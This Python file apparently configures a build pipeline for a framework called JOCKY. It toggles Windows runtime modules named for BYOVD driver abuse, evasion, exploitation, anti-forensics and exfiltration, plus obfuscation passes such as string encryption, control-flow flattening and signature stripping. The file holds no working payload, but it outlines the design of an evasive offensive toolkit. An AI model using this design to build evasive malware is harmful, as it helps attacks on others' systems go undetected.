#!/usr/bin/env python3
"""
JOCKY Backend Configuration System

Allows users to configure which Runtime APIs and Obfuscation passes to include
in the compilation pipeline. Similar to compile_pipeline.py but for backend APIs.
"""

import json
import yaml
from pathlib import Path
from typing import Dict, List, Optional


class RuntimeAPI:
    """Represents a Runtime API module"""

    def __init__(self, name: str, category: str, path: str, required: bool = False):
        self.name = name
        self.category = category  # audit, byovd, plugin, sandbox, etc.
        self.path = path  # Path to .c file or FFI declaration
        self.required = required
        self.enabled = required

    def __repr__(self):
        status = "✓" if self.enabled else "✗"
        req = "[REQUIRED]" if self.required else ""
        return f"{status} {self.name} ({self.category}) {req}"


class ObfuscationPass:
    """Represents an Obfuscation Pass"""

    def __init__(self, name: str, stage: str, command: str, enabled: bool = True):
        self.name = name
        self.stage = stage  # mlir, llvm
        self.command = command  # The actual pass command
        self.enabled = enabled

    def __repr__(self):
        status = "✓" if self.enabled else "✗"
        return f"{status} {self.name} ({self.stage}) - {self.command}"


class BackendConfig:
    """Backend Configuration Manager"""

    # Default Runtime APIs
    DEFAULT_APIS = {
        "audit": RuntimeAPI("audit", "audit", "src/runtime/windows/audit/audit.c"),
        "byovd": RuntimeAPI("byovd", "byovd", "src/runtime/windows/byovd/", required=True),
        "evasion": RuntimeAPI("evasion", "evasion", "src/runtime/windows/evasion/"),
        "exploitation": RuntimeAPI("exploitation", "exploitation", "src/runtime/windows/exploitation/"),
        "registry": RuntimeAPI("registry", "registry", "src/runtime/windows/registry/registry.c"),
        "forensics": RuntimeAPI("forensics", "forensics", "src/runtime/windows/anti_forensics/"),
        "exfil": RuntimeAPI("exfil", "exfil", "src/runtime/windows/exfil/"),
        "plugin": RuntimeAPI("plugin", "plugin", "src/runtime/core/plugin.c"),
        "sandbox": RuntimeAPI("sandbox", "sandbox", "src/runtime/core/sandbox.c"),
        "ai_ml": RuntimeAPI("ai_ml", "ai", "src/runtime/ai/"),
    }

    # Default Obfuscation Passes
    DEFAULT_PASSES = {
        "string_encrypt": ObfuscationPass("string_encrypt", "mlir", "string-encrypt"),
        "constant_obfuscate": ObfuscationPass("constant_obfuscate", "mlir", "constant-obfuscate"),
        "symbol_obfuscate": ObfuscationPass("symbol_obfuscate", "mlir", "symbol-obfuscate"),
        "boguscf": ObfuscationPass("boguscf", "llvm", "boguscf"),
        "flattening": ObfuscationPass("flattening", "llvm", "flattening"),
        "substitution": ObfuscationPass("substitution", "llvm", "substitution"),
        "split": ObfuscationPass("split", "llvm", "split"),
        "indirect_call": ObfuscationPass("indirect-call", "llvm", "indirect-call"),
        "strip_signature": ObfuscationPass("strip_signature", "llvm", "strip-signature"),
    }

    def __init__(self, config_file: Optional[Path] = None):
        self.apis = {k: v for k, v in self.DEFAULT_APIS.items()}
        self.passes = {k: v for k, v in self.DEFAULT_PASSES.items()}
        self.config_file = config_file

        if config_file and config_file.exists():
            self.load(config_file)

    def load(self, path: Path) -> None:
        """Load configuration from YAML or JSON file"""
        with open(path) as f:
            if path.suffix == '.json':
                config = json.load(f)
            else:
                config = yaml.safe_load(f)

        # Apply API configuration
        if 'apis' in config:
            for api_name, settings in config['apis'].items():
                if api_name in self.apis:
                    self.apis[api_name].enabled = settings.get('enabled', True)

        # Apply Obfuscation Pass configuration
        if 'obfuscation' in config:
            for pass_name, settings in config['obfuscation'].items():
                if pass_name in self.passes:
                    self.passes[pass_name].enabled = settings.get('enabled', True)

    def save(self, path: Path) -> None:
        """Save configuration to YAML file"""
        config = {
            'apis': {
                name: {'enabled': api.enabled}
                for name, api in self.apis.items()
            },
            'obfuscation': {
                name: {'enabled': pass_.enabled}
                for name, pass_ in self.passes.items()
            }
        }

        with open(path, 'w') as f:
            yaml.dump(config, f, default_flow_style=False)

    def enable_api(self, name: str) -> bool:
        """Enable a runtime API"""
        if name in self.apis:
            self.apis[name].enabled = True
            return True
        return False

    def disable_api(self, name: str) -> bool:
        """Disable a runtime API (if not required)"""
        if name in self.apis and not self.apis[name].required:
            self.apis[name].enabled = False
            return True
        return False

    def enable_pass(self, name: str) -> bool:
        """Enable an obfuscation pass"""
        if name in self.passes:
            self.passes[name].enabled = True
            return True
        return False

    def disable_pass(self, name: str) -> bool:
        """Disable an obfuscation pass"""
        if name in self.passes:
            self.passes[name].enabled = False
            return True
        return False

    def get_enabled_apis(self) -> Dict[str, RuntimeAPI]:
        """Get all enabled APIs"""
        return {name: api for name, api in self.apis.items() if api.enabled}

    def get_enabled_passes(self, stage: Optional[str] = None) -> Dict[str, ObfuscationPass]:
        """Get all enabled obfuscation passes, optionally filtered by stage"""
        passes = {name: p for name, p in self.passes.items() if p.enabled}
        if stage:
            passes = {name: p for name, p in passes.items() if p.stage == stage}
        return passes

    def get_mlir_passes(self) -> str:
        """Get MLIR obfuscation passes as command string"""
        passes = self.get_enabled_passes('mlir')
        return ' '.join([f'--{p.command}' for p in passes.values()])

    def get_llvm_passes(self) -> str:
        """Get LLVM obfuscation passes as command string"""
        passes = self.get_enabled_passes('llvm')
        if not passes:
            return ""
        pass_list = ','.join([p.command for p in passes.values()])
        return f"function({pass_list}),module(indirect-call,strip-signature)"

    def print_summary(self) -> None:
        """Print configuration summary"""
        print("\n" + "="*60)
        print("JOCKY Backend Configuration")
        print("="*60)

        print("\nRuntime APIs:")
        print("-" * 60)
        for name, api in self.apis.items():
            print(f"  {api}")

        print("\nObfuscation Passes:")
        print("-" * 60)
        for name, pass_ in self.passes.items():
            print(f"  {pass_}")

        print("\nEnabled APIs: " + ", ".join(self.get_enabled_apis().keys()))
        print("MLIR Passes: " + self.get_mlir_passes())
        print("LLVM Passes: " + self.get_llvm_passes())
        print("="*60 + "\n")


if __name__ == "__main__":
    import sys

    # Example usage
    config = BackendConfig()

    # Customize configuration
    config.disable_pass("strip_signature")
    config.disable_api("ai_ml")
    config.enable_api("sandbox")

    config.print_summary()

    # Save configuration
    config_path = Path("backend_config.yaml")
    config.save(config_path)
    print(f"Configuration saved to {config_path}")
